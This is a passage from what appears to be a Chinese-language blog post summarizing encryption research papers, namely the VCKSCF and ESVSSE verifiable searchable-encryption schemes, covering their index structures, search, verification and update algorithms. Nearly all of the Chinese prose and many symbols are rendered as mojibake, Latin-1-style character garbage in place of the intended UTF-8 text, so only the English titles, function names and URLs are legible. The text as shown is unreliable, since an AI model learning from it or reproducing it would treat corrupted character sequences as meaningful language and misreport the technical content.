ä½çš„ RH(q<sub>i</sub>) å“ˆå¸Œå€¼ã€‚å¦‚æœæ‰¾åˆ°ï¼Œåˆ™æœåŠ¡å™¨å°†æ£€ç´¢åŒ¹é…èŠ‚ç‚¹ä¸­çš„åŠ å¯†æ–‡ä»¶æ ‡è¯†ç¬¦ï¼Œå¹¶å°†å®ƒä»¬è¿”å›ç»™æ•°æ®ç”¨æˆ·ã€‚\n\n\n\n##  ~~â‘©VCKSCFæ–¹æ¡ˆ~~\n\n**è®ºæ–‡åç§°ï¼šã€ŠVCKSCF: Efficient Verifiable Conjunctive Keyword Search Based on Cuckoo Filter for Cloud Storageã€‹**\n\n- ä½œè€…ï¼šé™ˆå‡¡ï¼›è‘£å°ç£Šï¼›æ›¹æŒ¯å¯Œï¼›æ²ˆå®¶è¾°\n- å•ä½ï¼šä¸Šæµ·å¸‚å¯ä¿¡è®¡ç®—é‡ç‚¹å®éªŒå®¤ã€åä¸œå¸ˆèŒƒå¤§å­¦\n- ä¼šè®®ï¼š[TrustCom](https://ieeexplore.ieee.org/document/9343045)ã€CCF Cã€‘\n- æ—¶é—´ï¼š2021å¹´12æœˆ\n\n### 1ã€æ€»ä½“æ€è·¯\n\næå‡ºäº†ä¸€ç§åŸºäº Cuckoo è¿‡æ»¤å™¨ (VCKSCF) çš„å¯éªŒè¯è¿æ¥å…³é”®å­—æœç´¢æ–¹æ¡ˆï¼Œè¯¥æ–¹æ¡ˆæ˜¾ç€é™ä½äº†éªŒè¯å’Œå­˜å‚¨å¼€é”€ã€‚å®‰å…¨æ€§åˆ†æè¡¨æ˜ï¼Œè¯¥æ–¹æ¡ˆåœ¨é¢ä¸´é€‰æ‹©å…³é”®å­—æ”»å‡»ä¸‹çš„ä¸å¯åŒºåˆ†æ€§ä»¥åŠè¯æ˜å’Œæœç´¢ä»¤ç‰Œçš„ä¸å¯ä¼ªé€ æ€§æ—¶å®ç°äº†å®‰å…¨æ€§ã€‚\n\næœ¬æ–‡çš„ä¸»è¦è´¡çŒ®å½’çº³å¦‚ä¸‹:\n\n- 1.é€šè¿‡ Cuckoo è¿‡æ»¤å™¨ (VCKSCF) æ„å»ºäº†ä¸€ä¸ªé«˜æ•ˆä¸”å¯éªŒè¯çš„è¿æ¥å…³é”®å­—æœç´¢æ–¹æ¡ˆã€‚åˆ›æ–°ç­–ç•¥äº§ç”Ÿæ›´å°‘çš„è®¡ç®—å’Œå­˜å‚¨å¼€é”€\n- 2.é€šè¿‡åœ¨æœåŠ¡å™¨ç«¯é‡‡ç”¨ç‰¹å®šçš„çŸ©é˜µä½œä¸ºå­˜å‚¨ç»“æ„æ¥ä¿æŠ¤æœ€ä¸é¢‘ç¹å…³é”®å­—çš„éšç§ï¼Œå…¶ä¸­æ¯ä¸ªæœ€ä¸é¢‘ç¹å…³é”®å­—çš„ä½ç½®ç”±å…¶å·¦å³éƒ¨åˆ†ç¡®å®š\n- 3.æˆ‘ä»¬ç»™å‡ºäº†æ­£å¼çš„å®‰å…¨åˆ†ææ¥è¯æ˜æˆ‘ä»¬çš„æ–¹æ¡ˆå®ç°äº†IND-CKAå®‰å…¨ï¼Œæœç´¢ä»¤ç‰Œå’Œç‰¹å®šå…³é”®å­—æŸ¥è¯¢çš„è¯æ˜æ˜¯ä¸å¯ä¼ªé€ çš„ã€‚åœ¨çœŸå®æ•°æ®åº“ä¸­çš„å®éªŒè¡¨æ˜ï¼Œæˆ‘ä»¬çš„æ–¹æ¡ˆå…·æœ‰è¾ƒä½çš„é€šä¿¡æˆæœ¬å’Œä¼˜åŒ–çš„æ•ˆç‡\n\n**ç”±äºæœ¬ç¯‡è®ºæ–‡é‡‡ç”¨å…¬é’¥å¯†ç å®ç°ï¼Œæ•…ä¸å†æ·±å…¥ã€‚ã€‚ã€‚**\n\n## â‘ªESVSSEæ–¹æ¡ˆ\n\n**è®ºæ–‡åç§°ï¼šã€ŠESVSSE: Enabling Efficient, Secure, Verifiable Searchable Symmetric Encryptionã€‹**\n\n- ä½œè€…ï¼šçŸ³æŒ¯å¥;å‚…é›ªæ¢…;æè´¤è´¤;æœ±å‡¯\n- å•ä½ï¼šå¹¿è¥¿å¸ˆèŒƒå¤§å­¦\n- ä¼šè®®ï¼š[IEEE Transactions on Knowledge and Data Engineering](https://ieeexplore.ieee.org/document/9201320)ã€CCF Aã€‘\n- æ—¶é—´ï¼š2020å¹´09æœˆ\n\n### 1ã€æ€»ä½“æ€è·¯\n\næœ¬æ–‡æå‡ºäº†ä¸€ç§åŸºäº **B<sup>+</sup>-Tree** å’Œ**è®¡æ•°å¸ƒéš†è¿‡æ»¤å™¨** (CBF) çš„é«˜æ•ˆ **SSE** æ–¹æ¡ˆï¼Œè¯¥æ–¹æ¡ˆæ”¯æŒå®‰å…¨éªŒè¯ã€åŠ¨æ€æ›´æ–°å’Œå¤šç”¨æˆ·æŸ¥è¯¢ã€‚ä¸ä¹‹å‰çš„æœ€æ–°æŠ€æœ¯ç›¸æ¯”ï¼Œæˆ‘ä»¬è®¾è®¡äº†æ–°çš„æ•°æ®ç»“æ„ CBFï¼Œä»¥æ”¯æŒ**åŠ¨æ€æ›´æ–°**å’Œ**å¢å¼ºéªŒè¯**ã€‚æˆ‘ä»¬é€šè¿‡ç»¼åˆå®éªŒè¯„ä¼°æˆ‘ä»¬çš„æ–¹æ¡ˆã€‚ç»“æœä¸æˆ‘ä»¬çš„åˆ†æä¸€è‡´ï¼Œè¡¨æ˜æˆ‘ä»¬çš„æ–¹æ¡ˆæ˜¯å®‰å…¨çš„ï¼Œå¹¶ä¸”ä¸ä»¥å‰å…·æœ‰ç›¸åŒåŠŸèƒ½çš„æ–¹æ¡ˆç›¸æ¯”æ›´æœ‰æ•ˆã€‚å½“æœç´¢å…³é”®å­—çš„ç¼ºå¤±ç‡ä¸º 20% æ—¶ï¼Œäº‘æœåŠ¡å™¨å’Œç”¨æˆ·çš„å¹³å‡æ€§èƒ½å¯ä»¥æé«˜ 20% å·¦å³ã€‚å¹¶ä¸”ä¸¢å¤±ç‡è¶Šé«˜ï¼Œæ€§èƒ½å¯ä»¥æé«˜çš„è¶Šå¤šã€‚\n\n### 2ã€ä½¿ç”¨æŠ€æœ¯\n\n- B<sup>+</sup>-Tree\n- è®¡æ•°å¸ƒéš†è¿‡æ»¤å™¨(CBF)\n\n### 3ã€æ–¹æ¡ˆæ¦‚è¿°\n\n#### å¯†é’¥ç”Ÿæˆ\n\nGen(1<sup>k</sup>) â†’ {K<sub>1</sub>ï¼ŒK<sub>2</sub>ï¼ŒK<sub>3</sub>ï¼Œ(ssk,spk)}\n\n- è¾“å…¥ï¼šå®‰å…¨å‚æ•° k \n- è¾“å‡ºï¼šç§æœ‰å¯†é’¥ K<sub>1</sub>ï¼ŒK<sub>2</sub>ï¼ŒK<sub>3</sub> ï¼Œéšæœºç­¾åå¯†é’¥å¯¹(ssk,spk)\n\n#### åˆå§‹åŒ–\n\nInit(K<sub>1</sub>ï¼ŒK<sub>2</sub>ï¼ŒK<sub>3</sub>ï¼Œsskï¼ŒD) â†’ {Iï¼ŒÏ€ï¼ŒÏ€<sub>bf</sub>ï¼ŒC}\n\n<img src=\"https://img.jwt1399.top/img/202206211855497.png\" style=\"zoom:50%;\" />\n\n- è¾“å…¥ï¼š\n  - å¯†é’¥ K<sub>1</sub>ï¼ŒK<sub>2</sub>ï¼ŒK<sub>3</sub>ï¼Œç­¾åç§é’¥ ssk ï¼Œæ–‡æ¡£é›† D \n  - ä¼ªéšæœºå‡½æ•° *F*ã€*G*ï¼š {0,1}<sup>k</sup> x {0,1}<sup>*</sup> â†’ {0,1}<sup>\\*</sup>\n  - å“ˆå¸Œå‡½æ•° *IH*ï¼š {0,1}<sup>*</sup> â†’ {0,1}<sup>k</sup>\n- è¾“å‡ºï¼š\n  - åŸºäº B<sup>+</sup>-Tree çš„å®‰å…¨ç´¢å¼• Iï¼ŒåŠ å¯†æ–‡æ¡£ Cï¼Œè®¤è¯å™¨ Ï€ å’Œ CBF çš„è®¤è¯å™¨ Ï€<sub>bf</sub>\n  - Ï€<sub>bf</sub> æ˜¯ä¸€ä¸ªéªŒè¯å™¨ï¼Œå½“ç”¨æˆ·æŸ¥è¯¢çš„å…³é”®å­—ä¸å­˜åœ¨æ—¶ï¼Œå®ƒå¯ä»¥æä¾›éªŒè¯\n- æ“ä½œï¼š\n  - å€’æ’ç´¢å¼• âˆ† = <Ï‰<sub>i</sub>,D<sub>Ï‰<sub>i</sub></sub>> ï¼ŒD<sub>Ï‰<sub>i</sub></sub> = {f<sub>i</sub>,f<sub>j</sub>,f<sub>k</sub>...}\n  - é™·é—¨ï¼š Ï„<sub>Ï‰<sub>i</sub></sub> = F(K<sub>1</sub>,Ï‰<sub>i</sub>)\n  - å…³é”®å­—å¯¹åº”æ–‡æ¡£å“ˆå¸Œå€¼ï¼šV<sub>Ï‰<sub>i</sub></sub> = âˆ‘<sub>f<sub>i</sub>âˆˆD<sub>Ï‰<sub>i</sub></sub></sub> *IH*(G(K<sub>2</sub>,f<sub>i</sub>))\n  - ç´¢å¼•ï¼šI = I.Insert(âˆ†,Ï„<sub>Ï‰<sub>i</sub></sub>,V<sub>Ï‰<sub>i</sub></sub>)\n  - Ï€ = (V<sub>Ï‰<sub>i</sub></sub>,Sig(V<sub>Ï‰<sub>i</sub></sub>))ã€Ï€<sub>bf</sub> = (Ïˆ<sup>n</sup><sub>bf</sub>,Sig(Ïˆ<sup>n</sup><sub>bf</sub>))\n  - æ•°æ®æ‰€æœ‰è€…åœ¨æœ¬åœ°å­˜å‚¨æ•°æ® I å’Œ Ï€<sub>bf</sub>ï¼ŒåŒæ—¶å°† Iã€Cã€Ï€ å’Œ Ï€<sub>bfÂ </sub>å‘é€åˆ°äº‘æœåŠ¡å™¨\n\n#### é¢„æ›´æ–°\n\nPreUpdate(K<sub>1</sub>ï¼ŒK<sub>2</sub>ï¼ŒK<sub>3</sub>ï¼Œsskï¼Œf) â†’ {Ï„<sub>Ï‰</sub>ï¼ŒÏ€ï¼ŒÏ€<sub>bf</sub>}\n\n- è¾“å…¥ï¼šç§é’¥ K<sub>1</sub>ï¼ŒK<sub>2</sub>ï¼ŒK<sub>3</sub> ï¼Œç­¾åç§é’¥ sskï¼Œè¦æ›´æ–°çš„æ–‡ä»¶ f \n- è¾“å‡ºï¼šæ›´æ–° token Ï„<sub>Ï‰</sub> ï¼Œè®¤è¯å™¨ Ï€\n- æ“ä½œï¼šæ•°æ®æ‰€æœ‰è€…å°† Ï„<sub>Ï‰</sub>ï¼ŒÏ€<sub>bf</sub> å’Œ Ï€ å‘é€åˆ°äº‘æœåŠ¡å™¨\n\n#### æ›´æ–°\n\nUpdate(Iï¼ŒÏ„<sub>Ï‰</sub>) â†’ {I'}\n\n- è¾“å…¥ï¼šå®‰å…¨ç´¢å¼• I ï¼Œæ›´æ–° token Ï„<sub>Ï‰</sub>\n\n- è¾“å‡ºï¼šæ–°çš„å®‰å…¨ç´¢å¼• I'\n\n#### é™·é—¨\n\nTrapdoor(K<sub>1</sub>ï¼ŒÏ‰) â†’ {Ï„<sub>Ï‰</sub>}\n\nç”±ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·è¿è¡Œï¼Œä»¥ç”Ÿæˆç»™å®šå…³é”®å­—çš„é™·é—¨ã€‚\n\n- è¾“å…¥ï¼šå¯†é’¥ K<sub>1</sub>ï¼Œå…³é”®å­— Ï‰\n\n- è¾“å‡ºï¼šä¸ Ï‰ å¯¹åº”çš„é™·é—¨ Ï„<sub>Ï‰</sub>\n\n- æ“ä½œï¼š Ï„<sub>Ï‰<sub>i</sub></sub> = F(K<sub>1</sub>,Ï‰<sub>i</sub>)\n\n#### æœç´¢\n\nSearch(Iï¼ŒÏ„<sub>Ï‰</sub>ï¼Œt<sub>q</sub>ï¼‰â†’ {ï¼ˆÏï¼ŒÏ€<sup>t</sup><sub>q</sub>ï¼ŒÏ€<sub>c</sub>ï¼ŒR<sub>Ï‰</sub>ï¼‰orï¼ˆÏ€<sub>bf</sub>ï¼‰}\n\n- è¾“å…¥ï¼šå®‰å…¨ç´¢å¼• I ï¼Œé™·é—¨ Ï„<sub>Ï‰</sub>ã€æŸ¥è¯¢æ—¶é—´ t<sub>q</sub>\n- è¾“å‡ºï¼šæœç´¢ç»“æœçš„è·¯å¾„åˆ—è¡¨ Ïï¼ŒéªŒè¯å™¨ Ï€<sup>t</sup><sub>q</sub>ã€Ï€<sub>c</sub> ã€æœç´¢ç»“æœçš„åŠ å¯†æ–‡æ¡£ R<sub>Ï‰</sub>\n- æ“ä½œï¼šæœåŠ¡å™¨å°† Ïï¼ŒÏ€<sup>t</sup><sub>q</sub>ï¼ŒÏ€<sub>c</sub>ï¼ŒR<sub>Ï‰</sub> å‘é€ç»™ç”¨æˆ·ï¼Œæˆ–è€…è¾“å‡ºä¸€ä¸ªæ ¡å¯¹éªŒè¯å™¨ Ï€<sub>bf</sub>\n\n#### éªŒè¯\n\nValidation(K<sub>1</sub>ï¼ŒK<sub>2</sub>ï¼ŒK<sub>3</sub>ï¼Œspkï¼ŒR<sub>Ï‰</sub>ï¼ŒÏï¼ŒÏ€<sup>t</sup><sub>q</sub>ï¼ŒÏ€<sub>c</sub>ï¼ŒÏ„<sub>Ï‰</sub>ï¼ŒÏ€<sub>bf</sub>) â†’ {0,1}\n\n- è¾“å…¥ï¼šå¯¹ç§°å¯†é’¥ K<sub>1</sub>ï¼ŒK<sub>2</sub>ï¼ŒK<sub>3</sub>ï¼Œå…¬é’¥ spkï¼ŒæŸ¥è¯¢ç»“æœ R<sub>Ï‰</sub>ï¼Œå®‰å…¨åˆ—è¡¨ Ïï¼Œè®¤è¯å™¨ Ï€<sup>t</sup><sub>q</sub>ï¼ŒÏ€<sub>c</sub>ï¼ŒÏ€<sub>bf</sub> ï¼ŒÏ‰å¯¹åº”çš„ä»¤ç‰Œ Ï„<sub>Ï‰Â </sub>\n- è¾“å‡ºï¼šç”¨æˆ·æ¥å—æŸ¥è¯¢ç»“æœè¿”å› 1 ï¼Œæ‹’ç»æŸ¥è¯¢ç»“æœè¿”å› 0 \n\n### 4ã€æ–¹æ¡ˆæ„å»º\n\n#### å®‰å…¨ç´¢å¼•\n\n- ä½¿ç”¨ B<sup>+</sup> æ ‘ç»“æ„æ¥æ„å»ºå®‰å…¨ç´¢å¼•ï¼Œç´¢å¼•æ˜¯æ ¹æ®æ–‡æ¡£é›†åˆ D å’Œå€’æ’åˆ—è¡¨ âˆ† æ„å»º\n\n- å®Œæ•´å€’æ’åˆ—è¡¨åŒ…æ‹¬å››éƒ¨åˆ†ï¼š<Ï‰<sub>i</sub>,D<sub>Ï‰<sub>i</sub></sub>,Ï„<sub>Ï‰<sub>i</sub></sub> ,V<sub>Ï‰<sub>i</sub></sub>>\n  - å…³é”®å­— \n  - å…³é”®å­—å¯¹åº”æ–‡æ¡£\n  - å…³é”®è¯å¯¹åº”çš„é™·é—¨(Token) \n  - å…³é”®å­—å¯¹åº”æ–‡æ¡£çš„å“ˆå¸Œå€¼\n\nä¸ºäº†é˜²æ­¢äº‘æœåŠ¡å™¨å‘èµ·é‡æ”¾æ”»å‡»ï¼Œå¹¶ä¿è¯æ ¹çš„æ–°é²œåº¦ï¼Œä¸ºéªŒè¯è€…ç»´æŠ¤äº†ä¸€ä¸ªæ—¶é—´æˆ³é“¾ï¼Œè¿™æ ·ç”¨æˆ·å°±å¯ä»¥è·Ÿè¸ªé“¾ä¸­çš„èº«ä»½éªŒè¯è€…ï¼Œå¹¶ç¡®ä¿æ ¹æ˜¯å¦æ–°é²œã€‚\n\næ•°æ®æ‰€æœ‰è€…æ ¹æ®ä¸‹å¼ç”ŸæˆéªŒè¯è€…\n\n![](https://img.jwt1399.top/img/202206211855766.png)\n\n- i è¡¨ç¤ºç¬¬ i ä¸ªæ›´æ–°é—´éš”ï¼Œj è¡¨ç¤ºè¯¥é—´éš”å†…çš„ç¬¬ j ä¸ªéªŒè¯å™¨\n\n- Î½<sub>i,j</sub> ä»£è¡¨ B<sup>+</sup>-Tree çš„æ—¶é—´æˆ³ tp<sub>i,jÂ </sub>å’Œæ ¹ rt<sub>i,jÂ </sub>çš„åŠ å¯†\n- Ï€<sub>i,jÂ </sub>åŒ…å«äº†Î½<sub>i,jÂ </sub>å’Œæ•°æ®æ‰€æœ‰è€…å¯¹ Î½<sub>i,j</sub> çš„ç­¾å\n\næ ¹æ®ä¸‹å¼è®¡ç®— Ï€<sub>bf </sub>ï¼ŒÏ€<sub>bfÂ </sub>æ˜¯ä¸€ä¸ªç»´æŠ¤æ—¶é—´æˆ³é“¾å’Œç­¾åçš„éªŒè¯å™¨\n\n![](https://img.jwt1399.top/img/202206211855143.png)\n\nç”±äºæ™®é€šçš„ Bloom Filter ä¸æ”¯æŒåŠ¨æ€æ›´æ–°ã€‚æ‰€ä»¥æˆ‘ä»¬å¼•å…¥äº† CBFï¼ŒCBF æ˜¯ä¸€ä¸ª Counting Bloom Filterï¼Œæœ¬æ–‡ä¸­ç”¨å®ƒå­˜å‚¨æ‰€æœ‰ token\n\nå‡è®¾æ•°æ®æ‰€æœ‰è€…æœ‰ä¸‰ä¸ªä»¤ç‰Œï¼ŒæœåŠ¡å™¨é€šè¿‡å››ä¸ªæ•£åˆ—å‡½æ•°å°†å…¶æ•£åˆ—åˆ° Bloom Filterã€‚\n\nå‡è®¾ç”¨æˆ·ç»™æŸ¥è¯¢ä¸€ä¸ªä»¤ç‰Œã€‚æœåŠ¡å™¨æ£€æŸ¥ CBF ä¸­æ˜¯å¦æœ‰ä¸€ä¸ª Ï„<sub>Ï‰<sub>i</sub></sub>å¯¹åº”ï¼Œäº‘æœåŠ¡å™¨åªéœ€è¦æ£€æŸ¥å¯¹åº”çš„ä½ç½®æ˜¯å¦éƒ½æ˜¯ 1ã€‚å¦‚æœå…¨ä¸º 1ï¼Œåˆ™è¦æŸ¥è¯¢çš„ Ï„<sub>Ï‰<sub>i</sub></sub> å­˜åœ¨ï¼Œå¦åˆ™ä¸å­˜åœ¨ã€‚\n\nå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¦‚æœæœ‰ä¸¤ä¸ªå…³é”®å­—ï¼Œè¢« 3 ä¸ªå“ˆå¸Œå‡½æ•°æ•£åˆ—åˆ° Bloom Filterï¼ŒCBF å¯¹äºåŠ æ³•æ“ä½œï¼Œç›¸åº”çš„ä½å¢åŠ  1ï¼Œåˆ é™¤æ“ä½œå¯¹åº”çš„ä½å‡å°‘ 1\n\n#### æŸ¥è¯¢è¿‡ç¨‹\n\nå½“æˆæƒç”¨æˆ·éœ€è¦æŸ¥è¯¢äº‘æœåŠ¡å™¨çš„æ•°æ®æ—¶ï¼Œç”¨æˆ·é¦–å…ˆä¸ºå…³é”®å­—ç”Ÿæˆä¸€ä¸ªé™·é—¨ tokenï¼Œç„¶åç”¨æˆ·å°† token å‘é€åˆ°äº‘æœåŠ¡å™¨ï¼Œäº‘æœåŠ¡å™¨æ‰§è¡Œæœç´¢ç®—æ³•ï¼Œå…·ä½“ç®—æ³•å¦‚ä¸‹å›¾æ‰€ç¤º\n\n<img src=\"https://img.jwt1399.top/img/202206211855595.png\" style=\"zoom:50%;\" />\n\nSearch(Iï¼ŒÏ„<sub>Ï‰</sub>ï¼Œt<sub>q</sub>ï¼‰â†’ {ï¼ˆÏï¼ŒÏ€<sup>t</sup><sub>q</sub>ï¼ŒÏ€<sub>c</sub>ï¼ŒR<sub>Ï‰</sub>ï¼‰orï¼ˆÏ€<sub>bf</sub>ï¼‰}\n\nå½“äº‘æœåŠ¡å™¨æ¥æ”¶åˆ°ç”¨æˆ·å‘é€çš„ token æ—¶ï¼Œè€ƒè™‘ä¸¤ç§æƒ…å†µ: åœ¨ç´¢å¼•ä¸­ token å­˜åœ¨æˆ–ä¸å­˜åœ¨ã€‚\n\næœåŠ¡å™¨åªéœ€è¦å°†æŸ¥è¯¢çš„ token æ•£åˆ—åˆ°å¦ä¸€ä¸ªå…·æœ‰ k ä¸ªæ•£åˆ—å‡½æ•°çš„ CBFã€‚æœåŠ¡å™¨é€šè¿‡æµ‹è¯•å¯¹åº”ä½æ˜¯å¦å…¨éƒ¨ä¸º 1 æ¥éªŒè¯ç”¨æˆ·æŸ¥è¯¢åˆ°çš„ token æ˜¯å¦å­˜åœ¨ã€‚\n\n- 1ã€å¦‚æœä¸æ˜¯æ‰€æœ‰æµ‹è¯•ä½éƒ½æ˜¯ 1ï¼Œåˆ™è¯æ˜ token ä¸å­˜åœ¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨åªéœ€è¦è¿”å› Ï€<sub>bf</sub> ç»™ç”¨æˆ·ï¼Œè€Œä¸éœ€è¦éå† B<sup>+</sup>-Treeã€‚æœç´¢å¤æ‚åº¦æ˜¯ O(1) \n- 2ã€å¦‚æœæ‰€æœ‰æµ‹è¯•ä½å‡ä¸º 1ï¼Œåˆ™è¯æ˜ token å­˜åœ¨ã€‚ç„¶åæœåŠ¡å™¨éœ€è¦æœç´¢ B<sup>+</sup>-Tree ç´¢å¼•ï¼Œå¹¶è¿”å›æœç´¢è·¯å¾„ Ïƒ  =  (r<sub>0</sub>,...,r<sub>i</sub>,...,r<sub>m</sub>) â† I.search(Ï„<sub>Ï‰i</sub>) ä¸­æ¯ä¸ªèŠ‚ç‚¹çš„ tokenï¼Œä»åº•éƒ¨åˆ°æ ¹ï¼Œä¸åŒ…æ‹¬å¶èŠ‚ç‚¹æœ¬èº«ã€‚r<sub>i</sub> âˆˆ {IN;LN}ï¼ŒIN ä¸ºå†…éƒ¨èŠ‚ç‚¹ï¼ŒLN ä¸ºå¶èŠ‚ç‚¹\n\næ³¨æ„ï¼Œå¯¹äºå†…éƒ¨èŠ‚ç‚¹ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è¿”å›ä¸åœ¨æœç´¢è·¯å¾„ Ïƒ ä¸­çš„ tokenã€‚ç„¶åï¼ŒæœåŠ¡å™¨éœ€è¦æ‰¾åˆ°éªŒè¯å™¨ Ï€<sup>t</sup><sub>q</sub> å’Œæ ¡éªŒç‚¹ Ï€<sub>c</sub>ï¼Œä¸”æ ¡éªŒç‚¹ Ï€<sub>c</sub> ä¸æŸ¥è¯¢æ—¶é—´ç›¸è¿‘ã€‚æœåŠ¡å™¨å‘é€ Ïï¼ŒÏ€<sup>t</sup><sub>q</sub>ï¼ŒÏ€<sub>c</sub>ï¼ŒC<sub>Ï‰i</sub> ç»™ç”¨æˆ·\n\n#### éªŒè¯ç»“æœ\n\nä¸ºäº†éªŒè¯æ•°æ®å®Œæ•´æ€§ï¼Œæˆ‘ä»¬ä½¿ç”¨å“ˆå¸Œå‡½æ•°å°† B<sup>+</sup>-Tree çš„æ¯ä¸ªèŠ‚ç‚¹ä»å¶èŠ‚ç‚¹é€å±‚å“ˆå¸Œåˆ°æ ¹èŠ‚ç‚¹ã€‚ç”¨æˆ·å¯ä»¥æ ¹æ®æ ¹èŠ‚ç‚¹éªŒè¯æŸ¥è¯¢ç»“æœçš„å®Œæ•´æ€§ã€‚å¦ä¸€ç§æ–¹æ³•æ˜¯ï¼Œæ•°æ®æ‰€æœ‰è€…åªå¯¹æ‰€æœ‰å¶èŠ‚ç‚¹è¿›è¡Œæ•£åˆ—ã€‚æœ¬æ–‡é‡‡ç”¨æ—¶é—´æˆ³æœºåˆ¶æ¥éªŒè¯æ•°æ®çš„æ–°é²œåº¦ã€‚\n\næ—¶é—´æˆ³æœºåˆ¶å¦‚å›¾7æ‰€ç¤ºã€‚å®ƒåŒ…æ‹¬æ›´æ–°é—´éš”å’ŒéªŒè¯è€…Ï€ã€‚æ›´æ–°é—´éš”ç”±æ•°æ®æ‰€æœ‰è€…æ ¹æ®æ›´æ–°é¢‘ç‡è®¾ç½®ã€‚éªŒè¯å™¨ç”±æ ¹å’Œ B<sup>+</sup>-Tree çš„æ—¶é—´æˆ³ç»„æˆã€‚\n\nä¸ºäº†é˜²æ­¢æœåŠ¡å™¨è¿”å›æŸ¥è¯¢ç»“æœçš„éƒ¨åˆ†ç‰ˆæœ¬æˆ–å†å²ç‰ˆæœ¬ã€‚æˆæƒç”¨æˆ·åœ¨æ”¶åˆ°äº‘æœåŠ¡å™¨å‘æ¥çš„æŸ¥è¯¢ç»“æœåï¼Œæ‰§è¡ŒéªŒè¯ç®—æ³•ã€‚åŒæ ·ï¼Œåœ¨ä¸¤ç§æƒ…å†µä¸‹ï¼Œç»“æœå¾—åˆ°äº†éªŒè¯ã€‚ä¸€ç§æ˜¯å…³é”®å­—ä¸å­˜åœ¨ï¼Œå¦ä¸€ç§æ˜¯å…³é”®å­—å­˜åœ¨\n\nå½“æŸ¥è¯¢åˆ°çš„å…³é”®å­—ä¸å­˜åœ¨æ—¶ï¼Œå¯ä»¥é€šè¿‡Ï€bféªŒè¯å™¨éªŒè¯è¯¥å…³é”®å­—æ˜¯å¦çœŸçš„ä¸å­˜åœ¨ã€‚é€šè¿‡éªŒè¯ç®—æ³•ï¼Œç”¨æˆ·å¯ä»¥éªŒè¯æœåŠ¡å™¨æ˜¯å¦æ˜¯æ¶æ„çš„ã€‚\n\nCBFéªŒè¯å™¨ç”±å¸¦æ—¶é—´æˆ³çš„CBF Bloom Filterå’Œæ•°æ®æ‰€æœ‰è€…çš„ç›¸åº”ç­¾åç»„æˆã€‚\nç”¨æˆ·å¯ä»¥é€šè¿‡CBFæ£€æŸ¥tokenæ˜¯å¦å­˜åœ¨ã€‚\né€šè¿‡æ—¶é—´æˆ³æœºåˆ¶å¯ä»¥æ£€æµ‹CBFçš„æ–°é²œåº¦ã€‚\nå¦‚æœéªŒè¯ç®—æ³•è¿”å›1ï¼Œåˆ™ç”¨æˆ·æ¥å—æœåŠ¡å™¨çš„ç»“æœã€‚å¦åˆ™ï¼Œå®ƒå°†æ‹’ç»è¿”å›çš„ç»“æœã€‚ç”¨æˆ·å¯ä»¥è¯æ˜è¯¥æœåŠ¡å™¨æ˜¯å¦æ˜¯æ¶æ„çš„ã€‚éªŒè¯çš„å¤æ‚åº¦ä¸ºO(1)ã€‚ç”¨æˆ·çš„æˆæœ¬å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚\n\nå½“æœç´¢çš„å…³é”®å­—å­˜åœ¨æ—¶ï¼Œç”¨æˆ·éœ€è¦æ ¹æ®æœåŠ¡å™¨è¿”å›çš„ç»“æœæ„å»ºB+-Treeçš„æ ¹ï¼Œå¹¶ä½¿ç”¨æ ¹æ¥éªŒè¯æœç´¢ç»“æœçš„å®Œæ•´æ€§ã€‚ç»“æœçš„æ–°é²œåº¦åŸºäºè§£å¯†éªŒè¯å™¨ä¸­çš„æ—¶é—´æˆ³è¿›è¡ŒéªŒè¯ã€‚ç”¨æˆ·å¯ä»¥æ ¹æ®æœåŠ¡å™¨è¿”å›çš„åˆ—è¡¨æ„å»ºæ ¹ï¼Œå¹¶é€šè¿‡ä¸éªŒè¯è€…çš„æ ¹è¿›è¡Œæ¯”è¾ƒæ¥éªŒè¯è¿”å›ç»“æœçš„å®Œæ•´æ€§ã€‚\n\nè®©æˆ‘ä»¬é€šè¿‡ä¸‹é¢çš„ä¾‹å­æ¥è§£é‡Šä»€ä¹ˆæ˜¯é‡æ”¾æ”»å‡»ã€‚è®©æˆ‘ä»¬è€ƒè™‘ä»¥ä¸‹æƒ…å†µ:\n\nå½“ç”¨æˆ·åœ¨t1(è§å›¾7)æŸ¥è¯¢æ—¶ï¼Œå…¶ä¸­t1<tpi,0ï¼ŒæœåŠ¡å™¨åªèƒ½è¿”å›Ï€iâˆ’1,nç»™ç”¨æˆ·ã€‚å½“ç”¨æˆ·åœ¨t2æŸ¥è¯¢tpi,0çš„æ•°æ®æ›´æ–°äº‹ä»¶åï¼ŒæœåŠ¡å™¨æœ‰ä¸¤ä¸ªé€‰é¡¹:ä¸€ä¸ªæ˜¯è¿”å›éªŒè¯è€…Ï€i,0ç»™ç”¨æˆ·;å¦ä¸€ç§æ˜¯éªŒè¯æ–¹å‘é€Ï€iâˆ’1,nç»™ç”¨æˆ·ã€‚å½“æœåŠ¡å™¨å‘ç”¨æˆ·è¿”å›Ï€iâˆ’1,næ—¶ï¼Œå‘èµ·æ–°é²œåº¦æ”»å‡»ã€‚\n\n#### æ›´æ–°æ“ä½œ\n\næ›´æ–°ç®—æ³•æ›´æ–°æœåŠ¡å™¨ä¸Šçš„å®‰å…¨ç´¢å¼•ï¼Œæ”¯æŒä¸‰ç§æ“ä½œï¼Œå³æ·»åŠ ã€åˆ é™¤å’Œç¼–è¾‘æ“ä½œã€‚\n\næ•°æ®æ‰€æœ‰è€…é¦–å…ˆæ‰§è¡Œé¢„æ›´æ–°ç®—æ³•ï¼Œä¸ºæ›´æ–°ç®—æ³•ã€CBF å’Œç­¾ååˆ›å»º tokenï¼Œå¹¶å°†å®ƒä»¬å‘é€åˆ°äº‘æœåŠ¡å™¨ã€‚\n\nç„¶åï¼Œäº‘æœåŠ¡å™¨æ‰§è¡Œæ›´æ–°ç®—æ³•å¯¹ CBF å’Œå®‰å…¨ç´¢å¼• I è¿›è¡Œæ›´æ–°ã€‚\n\nå› ä¸ºå®‰å…¨ç´¢å¼•å’Œæ–‡ä»¶éƒ½æ˜¯åŠ å¯†çš„ã€‚æœåŠ¡å™¨æ— æ³•ä»ä¸­å­¦åˆ°ä»»ä½•æœ‰ç”¨çš„ä¸œè¥¿ã€‚\n\nå¯¹äºåŠ æ³•è¿ç®—ï¼Œæ•°æ®æ‰€æœ‰è€…éœ€è¦ç”Ÿæˆ {Ï„Ï‰ï¼ŒG<sub>K<sub>2</sub></sub>(f)} å¯¹ï¼Œå…¶ä¸­ 